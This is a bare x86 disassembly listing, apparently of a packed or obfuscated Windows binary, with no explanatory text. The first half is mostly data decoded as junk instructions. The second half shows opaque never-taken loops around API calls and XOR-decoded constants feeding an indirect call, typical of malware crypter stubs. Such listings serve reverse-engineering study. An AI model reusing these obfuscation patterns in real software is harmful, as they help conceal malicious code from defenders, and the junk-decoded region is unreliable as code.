  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x386491c7],ecx
  4069de:	pushf  
  4069df:	(bad)  
  4069e0:	int    0x66
  4069e2:	(bad)  
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	xor    al,0x7b
  4069eb:	xchg   edi,eax
  4069ec:	xchg   ecx,eax
  4069ed:	lock push edi
  4069ef:	jmp    0x8d4624c3
  4069f4:	and    al,0x1c
  4069f6:	xor    eax,0xd497b306
  4069fb:	fcmovu st,st(3)
  4069fd:	sub    al,0xe5
  4069ff:	inc    ecx
  406a00:	sub    BYTE PTR [ebx],bh
  406a02:	or     DWORD PTR ds:0x574528d2,0x1d
  406a09:	push   esi
  406a0a:	pop    ebp
  406a0b:	jb     0x4069c6
  406a0d:	lods   al,BYTE PTR ds:[esi]
  406a0e:	sbb    BYTE PTR [edx],al
  406a10:	jo     0x4069e9
  406a12:	jecxz  0x406a4d
  406a14:	and    edx,ebp
  406a16:	xchg   esi,ecx
  406a18:	add    eax,0x63334f93
  406a1d:	loopne 0x4069d7
  406a1f:	outs   dx,DWORD PTR ds:[esi]
  406a20:	mov    al,0x14
  406a22:	add    eax,0x550f2026
  406a27:	inc    edi
  406a28:	retf   0xb91b
  406a2b:	xchg   esp,eax
  406a2c:	inc    ebx
  406a2d:	daa    
  406a2e:	mov    bh,0x40
  406a30:	or     al,0xdf
  406a32:	inc    esp
  406a33:	and    cl,ch
  406a35:	clc    
  406a36:	out    0x90,eax
  406a38:	xchg   edx,eax
  406a39:	xchg   edi,eax
  406a3a:	faddp  st(2),st
  406a3c:	les    esi,FWORD PTR [ebp+eiz*4-0x162fece2]
  406a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a44:	mov    ds:0x55033be8,eax
  406a49:	inc    ecx
  406a4a:	popf   
  406a4b:	ret    0xc73e
  406a4e:	inc    edi
  406a4f:	xchg   ebx,eax
  406a50:	inc    ebx
  406a52:	in     al,0xf7
  406a54:	dec    ebx
  406a55:	fadd   QWORD PTR [edi-0x4bc02f4e]
  406a5b:	lds    esp,FWORD PTR [esi-0x6c]
  406a5e:	dec    ebx
  406a5f:	sahf   
  406a60:	dec    ecx
  406a61:	ds sti 
  406a63:	pop    esi
  406a64:	lock inc edx
  406a66:	mov    bl,0xe6
  406a68:	not    DWORD PTR [eax+esi*1+0x10]
  406a6c:	les    edi,FWORD PTR [ebp+eiz*2+0x4b713aeb]
  406a73:	cmp    BYTE PTR [edi-0x5c067704],dl
  406a79:	into   
  406a7a:	bound  edi,QWORD PTR ds:0x20a946f2
  406a80:	adc    cl,BYTE PTR [ebx+eiz*8]
  406a83:	fsubr  DWORD PTR [ecx-0x94762ef]
  406a89:	sbb    al,0xa7
  406a8b:	jle    0x406aba
  406a8d:	(bad)  
  406a8e:	arpl   WORD PTR [ebx],bp
  406a90:	jmp    0xb6769713
  406a95:	sbb    dh,BYTE PTR [eax-0x58]
  406a98:	push   0x9ec8bae3
  406a9d:	mov    ah,0x40
  406a9f:	jnp    0x406a62
  406aa1:	aam    0xff
  406aa3:	lods   al,BYTE PTR ds:[esi]
  406aa4:	jne    0x406ab6
  406aa6:	lds    ecx,FWORD PTR ds:0x5497fcc7
  406aac:	sub    DWORD PTR [ebx+0x2d],esi
  406aaf:	enter  0x491b,0xf5
  406ab3:	push   0xcfb02e5f
  406ab8:	xor    eax,0x7e846369
  406abd:	pop    edx
  406abe:	jmp    0x4f9d:0xe8bb1eb4
  406ac5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406ac7:	adc    esp,DWORD PTR [ebx+0x10]
  406aca:	iret   
  406acb:	(bad)  
  406acc:	pusha  
  406acd:	mov    eax,ds:0x7fb22009
  406ad2:	loope  0x406aed
  406ad4:	cmp    eax,0x7b15df73
  406ad9:	fimul  DWORD PTR [ebx-0x6deb0adb]
  406adf:	repz inc BYTE PTR [eax]
  406ae2:	dec    DWORD PTR [eax-0x6c]
  406ae5:	aaa    
  406ae6:	lea    eax,[esi+0x57]
  406ae9:	xlat   BYTE PTR ds:[ebx]
  406aea:	out    dx,al
  406aeb:	xlat   BYTE PTR ds:[ebx]
  406aec:	adc    bh,BYTE PTR [edx]
  406aee:	xor    BYTE PTR [edi+0x4373b43a],ah
  406af4:	jl     0x406b13
  406af6:	pushf  
  406af7:	cwde   
  406af8:	sbb    BYTE PTR [ecx+0x3c],bl
  406afb:	jnp    0x406a80
  406afd:	push   cs
  406afe:	ins    BYTE PTR es:[edi],dx
  406aff:	(bad)  
  406b01:	imul   DWORD PTR [ebx+0x5c]
  406b04:	cmp    eax,0x544e401b
  406b09:	mov    ch,0xbd
  406b0b:	mov    eax,ds:0x58062d88
  406b10:	jo     0x406abc
  406b12:	frstor [ecx-0x1b]
  406b15:	js     0x406ac1
  406b17:	cli    
  406b18:	sub    bh,dl
  406b1a:	test   DWORD PTR [ebx-0x40117755],edx
  406b20:	sbb    BYTE PTR [eax],al
  406b22:	repnz add BYTE PTR [edi+0x770871b2],dh
  406b29:	jnp    0x406ab9
  406b2b:	xchg   ebx,eax
  406b2c:	aas    
  406b2d:	addr16 pop edi
  406b2f:	shr    BYTE PTR [esi],0x2e
  406b32:	ins    BYTE PTR es:[edi],dx
  406b33:	clc    
  406b34:	out    0x7f,al
  406b36:	mov    esp,DWORD PTR [ebp-0x5b74db2c]
  406b3c:	aaa    
  406b3d:	adc    al,BYTE PTR [edx-0x1d]
  406b40:	mov    esp,0xc87058da
  406b45:	mov    eax,esi
  406b47:	mov    ds:0x8a1b3e7a,al
  406b4c:	cli    
  406b4d:	cwde   
  406b4e:	mov    al,0x4
  406b50:	push   0xffffff82
  406b52:	adc    ecx,DWORD PTR [edi+0x668d5a74]
  406b58:	clc    
  406b59:	stos   DWORD PTR es:[edi],eax
  406b5a:	loop   0x406bb2
  406b5c:	xor    BYTE PTR [ecx+0x39f53508],bh
  406b62:	fcom   QWORD PTR [edi+esi*1+0x7a]
  406b66:	pop    edi
  406b67:	jmp    0x7bef:0xe8fb0474
  406b6e:	jae    0x406b7b
  406b70:	xor    bh,BYTE PTR [ebx+0x51065e52]
  406b76:	fwait
  406b77:	int    0x7f
  406b79:	aam    0xb5
  406b7b:	xchg   ecx,eax
  406b7c:	dec    esi
  406b7d:	push   eax
  406b7e:	mov    bh,0x82
  406b80:	test   eax,0xb905ef7a
  406b85:	mov    DWORD PTR gs:[edx+0x43587236],esp
  406b8c:	dec    BYTE PTR [ecx+0xdb3778]
  406b92:	imul   ebx,DWORD PTR [edi+0x22a2d18c],0xffffffa1
  406b99:	mov    dh,0x4e
  406b9b:	jmp    0x5490:0xf8ed1c8c
  406ba2:	dec    edx
  406ba3:	inc    esi
  406ba4:	sub    eax,0x7cbc95cb
  406ba9:	pop    DWORD PTR [edi-0x781e4afc]
  406baf:	sbb    al,0xec
  406bb1:	adc    eax,0x97692524
  406bb6:	cdq    
  406bb7:	ror    al,1
  406bb9:	fdivp  st(1),st
  406bbb:	cdq    
  406bbc:	test   al,0x33
  406bbe:	xor    DWORD PTR [esi],eax
  406bc0:	xor    DWORD PTR [edx],esi
  406bc2:	cli    
  406bc3:	bound  edx,QWORD PTR [edx+0x8d5b8dc]
  406bc9:	call   0x84403341
  406bce:	or     DWORD PTR [esi],ecx
  406bd0:	inc    eax
  406bd1:	push   edi
  406bd2:	xchg   edi,eax
  406bd3:	in     eax,dx
  406bd4:	arpl   WORD PTR [ebx],dx
  406bd6:	es and al,0xcf
  406bd9:	addr16 nop
  406bdb:	in     al,dx
  406bdc:	repz dec edi
  406bde:	jnp    0x406b61
  406be0:	adc    eax,DWORD PTR [ebx+0x31]
  406be3:	out    0x83,eax
  406be5:	into   
  406be6:	mov    ds:0x4e576e91,al
  406beb:	test   al,0x99
  406bed:	imul   ebp,DWORD PTR [ebx+0x2d5afecf],0x1e
  406bf4:	pop    ss
  406bf5:	jbe    0x406bd6
  406bf7:	(bad)  
  406bf8:	lods   eax,DWORD PTR ds:[esi]
  406bf9:	pop    edx
  406bfa:	retf   
  406bfb:	jle    0x406be9
  406bfd:	(bad)  
  406bfe:	mov    ecx,0x50457760
  406c03:	pusha  
  406c04:	sub    eax,0xd671011
  406c09:	dec    ebx
  406c0a:	iret   
  406c0b:	sbb    cl,BYTE PTR [eax+0x1]
  406c0e:	ds xor al,0xc6
  406c11:	push   edi
  406c12:	cwde   
  406c13:	sbb    ebx,edx
  406c15:	cdq    
  406c16:	xlat   BYTE PTR ds:[ebx]
  406c17:	out    dx,eax
  406c18:	add    DWORD PTR [edx-0x5b],eax
  406c1b:	mov    eax,0x1678881f
  406c20:	or     DWORD PTR [edi],0x525b558
  406c26:	cwde   
  406c27:	(bad)  
  406c28:	(bad)  
  406c29:	xlat   BYTE PTR ds:[ebx]
  406c2a:	push   0xbb22c158
  406c2f:	out    0x2d,eax
  406c31:	and    esp,edx
  406c33:	outs   dx,DWORD PTR ds:[esi]
  406c34:	mov    esi,0x7f9e3f64
  406c39:	xor    al,0x4f
  406c3b:	xchg   ebp,eax
  406c3c:	add    DWORD PTR ds:0xffa388f9,0x1a
  406c43:	jg     0x406c30
  406c45:	pop    esi
  406c46:	mov    edi,0xf66fc96
  406c4b:	test   BYTE PTR [edx+eax*1+0x35ff0000],bl
  406c52:	mov    dh,0x3c
  406c54:	inc    ecx
  406c55:	add    bh,bh
  406c57:	xor    eax,0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0x2ed02bde
  406c81:	inc    esp
  406c82:	jb     0x406c4b
  406c84:	ret    0x7e7e
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	pop    esi
  406c8c:	shl    ecx,1
  406c8e:	xchg   esi,eax
  406c8f:	rol    ecx,1
  406c91:	sbb    si,WORD PTR [edi]
  406c94:	std    
  406c95:	test   BYTE PTR [eax],0x98
  406c98:	cwde   
  406c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c9a:	jne    0x406c24
  406c9c:	inc    ebx
  406c9d:	lods   eax,DWORD PTR ds:[esi]
  406c9e:	sbb    eax,0x6d81d81b
  406ca3:	stos   BYTE PTR es:[edi],al
  406ca4:	add    BYTE PTR [eax-0x7ad9ab6d],dl
  406caa:	cld    
  406cab:	iret   
  406cac:	daa    
  406cad:	rol    BYTE PTR gs:[ebx+0x43c68b7d],cl
  406cb4:	js     0x406c5d
  406cb6:	inc    esp
  406cb7:	adc    edx,DWORD PTR ds:0x56151a01
  406cbd:	scas   eax,DWORD PTR es:[edi]
  406cbe:	dec    ebp
  406cbf:	lock xchg ebx,eax
  406cc1:	je     0x406cf5
  406cc3:	dec    ebx
  406cc4:	mov    al,0x0
  406cc6:	jl     0x406c9e
  406cc8:	cli    
  406cc9:	(bad)  [edx-0x4d9aeeec]
  406ccf:	shl    al,0xef
  406cd2:	pop    ds
  406cd3:	jmp    0x406cbc
  406cd5:	cmp    DWORD PTR [ebp+0x3b],0x97bec119
  406cdc:	bound  esp,QWORD PTR [esi]
  406cde:	adc    BYTE PTR [eax+0x78],cl
  406ce1:	pop    ebx
  406ce2:	adc    al,0x2b
  406ce4:	add    eax,DWORD PTR [ebx-0x6e70724c]
  406cea:	cmp    al,0x23
  406cec:	les    ecx,FWORD PTR [ecx-0x34007192]
  406cf2:	add    al,0xb2
  406cf4:	pop    ds
  406cf5:	daa    
  406cf6:	ficomp WORD PTR ds:0x17cc9a56
  406cfc:	dec    cl
  406cfe:	dec    ebp
  406cff:	aad    0xf3
  406d01:	in     eax,0x5
  406d03:	jge    0x406cc1
  406d05:	mov    bh,0xdd
  406d07:	jbe    0x406d0e
  406d09:	aaa    
  406d0a:	xchg   edi,eax
  406d0b:	fsub   QWORD PTR [edi]
  406d0d:	outs   dx,DWORD PTR ds:[esi]
  406d0e:	fild   QWORD PTR [ecx-0x48]
  406d11:	pop    ebx
  406d12:	bound  edx,QWORD PTR ds:0xd116e664
  406d18:	pop    ss
  406d19:	shl    BYTE PTR ds:0xb0b02685,cl
  406d1f:	retf   0x4a94
  406d22:	and    al,0x20
  406d24:	jle    0x406d5a
  406d26:	xor    dl,BYTE PTR [ebx]
  406d28:	daa    
  406d29:	mov    ebp,0xdaf8eac7
  406d2e:	xchg   ebp,eax
  406d2f:	pop    ds
  406d30:	jnp    0x406cca
  406d32:	add    eax,0x10aaac29
  406d37:	aaa    
  406d38:	aaa    
  406d39:	jle    0x406da9
  406d3b:	xchg   esp,eax
  406d3c:	xchg   edi,eax
  406d3d:	call   0x1d9423a0
  406d42:	stos   DWORD PTR es:[edi],eax
  406d43:	enter  0xef63,0x73
  406d47:	xchg   ebx,eax
  406d48:	cs sbb eax,0xa93fb180
  406d4e:	pusha  
  406d4f:	and    BYTE PTR [ecx],dh
  406d51:	adc    DWORD PTR [ecx+0x3e],ebp
  406d54:	sub    bh,al
  406d56:	adc    eax,0x49c13607
  406d5b:	sub    esi,edx
  406d5d:	in     al,dx
  406d5e:	or     DWORD PTR [eax],ecx
  406d60:	es or  ebp,ebp
  406d63:	jbe    0x406d9f
  406d65:	sar    BYTE PTR [eax-0x562d5419],0x8c
  406d6c:	jb     0x406d5a
  406d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d6f:	retf   
  406d70:	enter  0xc1d,0x7c
  406d74:	adc    edx,DWORD PTR [esi+edi*1-0x134a99d]
  406d7b:	jg     0x406d29
  406d7d:	mov    ds:0xc08ac02e,eax
  406d82:	int    0x67
  406d84:	jecxz  0x406dd8
  406d86:	dec    ebp
  406d87:	retf   0xdbe5
  406d8a:	jmp    0xda4e:0xda14069e
  406d91:	test   al,0xbb
  406d93:	out    dx,eax
  406d94:	inc    edi
  406d95:	mov    ebp,0xa628ad52
  406d9a:	stc    
  406d9b:	xchg   DWORD PTR [eax],ecx
  406d9d:	or     eax,0x294b4895
  406da2:	aaa    
  406da3:	pop    ecx
  406da4:	hlt    
  406da5:	xor    bl,BYTE PTR [ecx-0x5f]
  406da8:	es loopne 0x406d6a
  406dab:	mov    ah,ah
  406dad:	and    dl,ah
  406daf:	push   0xffffffda
  406db1:	dec    ecx
  406db2:	repnz int3 
  406db4:	sbb    dl,BYTE PTR [esi+0x5cb0c014]
  406dba:	test   eax,0x847e3b12
  406dbf:	inc    ebp
  406dc0:	inc    esi
  406dc1:	jo     0x406e41
  406dc3:	and    dl,BYTE PTR [ebx+esi*8+0x1e]
  406dc7:	sub    bh,ch
  406dc9:	mov    al,0xb
  406dcb:	div    eax
  406dcd:	test   DWORD PTR [eax+0x21],edx
  406dd0:	add    al,0x96
  406dd2:	in     al,dx
  406dd3:	inc    esi
  406dd4:	gs jle 0x406df8
  406dd7:	call   0x59d030e8
  406ddc:	mov    dl,0xb9
  406dde:	sub    DWORD PTR [ebx],0x38b0eae
  406de4:	mov    ebp,0x8a47e23b
  406de9:	lods   eax,DWORD PTR ds:[esi]
  406dea:	jb     0x406df0
  406dec:	ror    DWORD PTR [ecx+0x6a],0xb0
  406df0:	leave  
  406df1:	pop    es
  406df2:	xor    ebx,edx
  406df4:	(bad)  
  406df5:	pop    esp
  406df6:	les    ecx,FWORD PTR [ebx+esi*4+0x55]
  406dfa:	out    dx,al
  406dfb:	mov    al,0x6
  406dfd:	cli    
  406dfe:	enter  0x5910,0x99
  406e02:	xchg   esi,eax
  406e03:	cmpxchg ecx,esp
  406e06:	hlt    
  406e07:	adc    eax,0x4b98e42d
  406e0c:	jg     0x406e63
  406e0e:	mov    ds:0x604ac00a,eax
  406e13:	jne    0x406e4f
  406e15:	jns    0x406db3
  406e17:	mov    ebx,0xd0876329
  406e1c:	(bad)  
  406e1d:	das    
  406e1e:	and    bh,BYTE PTR [ebp+edx*1+0x55]
  406e22:	out    0x47,al
  406e24:	xchg   edx,eax
  406e25:	pop    esp
  406e26:	call   0x35d29b96
  406e2b:	jle    0x406eaa
  406e2d:	js     0x406e3a
  406e2f:	ins    BYTE PTR es:[edi],dx
  406e30:	imul   BYTE PTR [ebp-0x64]
  406e33:	cvtps2pi mm3,QWORD PTR [esi+eiz*4]
  406e37:	mov    ah,0x37
  406e39:	in     al,0xf4
  406e3b:	and    al,0xc5
  406e3d:	and    ecx,DWORD PTR [edi]
  406e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e40:	jne    0x406dda
  406e42:	mov    eax,ds:0xcb3888f9
  406e47:	inc    edi
  406e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e49:	fisubr DWORD PTR [ebp+0x30]
  406e4c:	jmp    0xc4b67564
  406e51:	push   es
  406e52:	dec    ebp
  406e53:	push   edx
  406e54:	rcr    BYTE PTR [edi-0x26],cl
  406e57:	mov    eax,0xc6098468
  406e5c:	mov    ch,0xce
  406e5e:	pop    esp
  406e5f:	inc    ebx
  406e60:	and    dl,BYTE PTR [eax+ebp*8+0x4e]
  406e64:	mov    bl,0x52
  406e66:	addr16 inc esi
  406e68:	(bad)  
  406e69:	popa   
  406e6a:	adc    esp,DWORD PTR [edx+0x77dcd740]
  406e70:	loope  0x406e57
  406e72:	popa   
  406e73:	mov    ebx,0xb086221
  406e78:	fwait
  406e79:	and    cl,BYTE PTR cs:[ebx]
  406e7c:	rcr    BYTE PTR [esi],0x17
  406e7f:	cmp    eax,0xa90cfc29
  406e84:	mov    esp,0x33d586d0
  406e89:	out    dx,al
  406e8a:	jp     0x406ed6
  406e8c:	xchg   edx,eax
  406e8d:	vsqrtsd xmm7,xmm6,QWORD PTR [esi-0x3deb48c6]
  406e95:	lds    ecx,FWORD PTR [eax+0x53]
  406e98:	adc    al,0x82
  406e9a:	sbb    eax,0xf3b2d069
  406e9f:	leave  
  406ea0:	cld    
  406ea1:	iret   
  406ea2:	jge    0x406e72
  406ea4:	fist   DWORD PTR [edx]
  406ea6:	jp     0x406e28
  406ea8:	adc    esp,DWORD PTR ds:0xaa87e68
  406eae:	popf   
  406eaf:	hlt    
  406eb0:	xor    cl,BYTE PTR [ecx+0x11cef56c]
  406eb6:	loope  0x406ed2
  406eb8:	mul    BYTE PTR [ebx-0x4d]
  406ebb:	jge    0x406f3a
  406ebd:	xor    dh,dh
  406ebf:	test   al,0x1d
  406ec1:	xchg   esp,eax
  406ec2:	ret    
  406ec3:	add    eax,0xc90454af
  406ec8:	xchg   edi,eax
  406ec9:	dec    edi
  406eca:	ds sub eax,0x81cf091f
  406ed0:	ins    BYTE PTR es:[edi],dx
  406ed1:	aam    0x4f
  406ed3:	cli    
  406ed4:	bswap  ebp
  406ed6:	xor    eax,0xc6fc72f8
  406edb:	mov    esi,edi
  406edd:	dec    ebp
  406ede:	arpl   cx,di
  406ee0:	mov    WORD PTR ds:[ebp+0x3957df99],ss
  406ee7:	jns    0x406eb7
  406ee9:	(bad)  
  406eea:	push   esp
  406eeb:	adc    DWORD PTR [ebx-0x3d36efbb],ecx
  406ef1:	or     al,0x0
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
